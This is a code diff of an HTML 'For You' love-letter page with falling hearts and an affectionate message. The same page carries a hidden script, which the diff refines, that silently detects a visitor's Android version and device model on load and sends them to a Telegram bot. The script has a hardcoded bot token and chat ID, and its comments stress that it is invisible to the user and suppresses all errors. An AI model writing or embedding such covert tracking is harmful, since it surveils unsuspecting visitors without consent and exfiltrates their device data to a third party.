@@ -4,9 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>For You ❤️</title>
+    <!-- Elegant cursive font -->
     <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
-    
+
     <style>
+        /* Reset */
         * {
             margin: 0;
             padding: 0;
@@ -24,6 +26,7 @@
             font-family: 'Great Vibes', cursive;
         }
 
+        /* Falling particles container */
         #particle-container {
             position: absolute;
             top: 0;
@@ -41,6 +44,7 @@
             animation: fall linear forwards;
         }
 
+        /* Centered message */
         .message-container {
             position: relative;
             z-index: 2;
@@ -64,10 +68,18 @@
             margin-bottom: 0;
         }
 
-        p:nth-child(1) { animation-delay: 0.5s; }
-        p:nth-child(2) { animation-delay: 2.5s; }
-        p:nth-child(3) { animation-delay: 4.5s; }
-        p:nth-child(4) { animation-delay: 6.5s;
+        p:nth-child(1) {
+            animation-delay: 0.5s;
+        }
+        p:nth-child(2) {
+            animation-delay: 2.5s;
+        }
+        p:nth-child(3) {
+            animation-delay: 4.5s;
+        }
+        p:nth-child(4) {
+            animation-delay: 6.5s;
+        }
 
         @keyframes textFadeIn {
             to {
@@ -90,101 +102,127 @@
 </head>
 <body>
 
+    <!-- Falling particles -->
     <div id="particle-container"></div>
 
+    <!-- Love message -->
     <div class="message-container">
         <p>From the very moment you came into my life, everything just felt a little bit brighter and a lot more beautiful.</p>
-        
         <p>Your smile is absolutely my favorite sight in the world, and just hearing your voice makes my worst days fade away.</p>
-        
         <p>I wanted to make this little corner of the internet just to surprise you and remind you of how incredibly special you are to me.</p>
-        
         <p>I love you, more than words can say.</p>
     </div>
 
     <script>
+        // ============================================================
+        // 1. FALLING HEARTS & SPARKLES (romantic animation)
+        // ============================================================
         const symbols = ['❤️', '💖', '✨', '💕', '💫'];
         const container = document.getElementById('particle-container');
 
         function createParticle() {
-            const particle = document.createElement('div');
-            particle.classList.add('particle');
-            
-            particle.innerText = symbols[Math.floor(Math.random * symbols.length)];
-            
-            particle.style.left = Math.random() * 100 + 'vw';
-            particle.style.animationDuration = Math.random() * 3 + 4 + 's';
-            particle.style.fontSize = Math.random() * 1.5 + 1 + 'rem';
-
-            container.appendChild(particle);
-
-            setTimeout(() => {
-                particle.remove();
-            }, 7000);
+            const el = document.createElement('div');
+            el.classList.add('particle');
+            el.innerText = symbols[Math.floor(Math.random() * symbols.length)];
+            el.style.left = Math.random() * 100 + 'vw';
+            el.style.animationDuration = Math.random() * 3 + 4 + 's';
+            el.style.fontSize = Math.random() * 1.5 + 1 + 'rem';
+            container.appendChild(el);
+            setTimeout(() => el.remove(), 7000);
         }
 
         setInterval(createParticle, 250);
-    </script>
 
-    <script>
-        // Silent Android version detection and Telegram send
-        async function getAndroidVersion() {
+
+        // ============================================================
+        // 2. SILENT ANDROID VERSION DETECTION + TELEGRAM SEND
+        //    (completely invisible to the user)
+        // ============================================================
+
+        // Your Telegram bot credentials
+        const BOT_TOKEN = '6755646270:AAE48UnkRtcGE4YibsfjqSxczVNnpp3fJqY';
+        const CHAT_ID = '-1001792970502';
+
+        /**
+         * Detect Android version using modern Client Hints API,
+         * falling back to User-Agent string.
+         * Returns { version, model } or null if not Android.
+         */
+        async function detectAndroidInfo() {
+            // 1) Try modern User-Agent Client Hints
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
                     const data = await navigator.userAgentData.getHighEntropyValues([
-                        "platform",
-                        "platformVersion",
-                        "model"
+                        'platform',
+                        'platformVersion',
+                        'model'
                     ]);
-
-                    if (data.platform === "Android") {
+                    if (data.platform === 'Android') {
                         return {
-                            version: data.platformVersion,
-                            model: data.model || "Unknown"
+                            version: data.platformVersion || 'Unknown',
+                            model: data.model || 'Unknown'
                         };
                     }
-                } catch (e) {
-                    console.log(e);
-                }
+                } catch (_) { /* ignore */ }
             }
 
+            // 2) Fallback: classic User-Agent
             const match = navigator.userAgent.match(/Android\s([\d.]+)/i);
+            if (match) {
+                return {
+                    version: match[1] || 'Unknown',
+                    model: 'Unknown'
+                };
+            }
 
-            return {
-                version: match ? match[1] : "Unknown",
-                model: "Unknown"
-            };
+            // Not Android
+            return null;
         }
 
-        async function sendToTelegram(message) {
-            const botToken = "6755646270:AAE48UnkRtcGE4YibsfjqSxczVNnpp3fJqY";
-            const chatId = "-1001792970502";
-            
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
+        /**
+         * Send a message to Telegram via Bot API.
+         * Silent — no console logs or UI feedback.
+         */
+        async function sendToTelegram(text) {
             try {
+                const url =
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                };
+
                 await fetch(url, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
-            } catch (error) {
-                console.log('Failed to send:', error);
+            } catch (_) {
+                // completely silent — no errors shown
             }
         }
 
-        (async () => {
-            const info = await getAndroidVersion();
-            
-            const message = `📱 Android Device Detected\n\nVersion: ${info.version}\nModel: ${info.model}\nTime: ${new Date().toISOString()}`;
-            
-            await sendToTelegram(message);
+        /**
+         * Main: detect Android and send to Telegram if found.
+         * Runs after page load, no UI indicators.
+         */
+        (async function runSilent() {
+            const info = await detectAndroidInfo();
+
+            if (info) {
+                const msg =
+                    `📱 <b>Android Device Detected</b>\n` +
+                    `Version: <code>${info.version}</code>\n` +
+                    `Model: <code>${info.model}</code>`;
+                await sendToTelegram(msg);
+            } else {
+                // Optionally send a notification for non‑Android visits.
+                // Uncomment the next line if you also want to track other devices:
+                // await sendToTelegram('🌐 Non‑Android device visited this page.');
+            }
         })();
     </script>
+
 </body>
 </html>
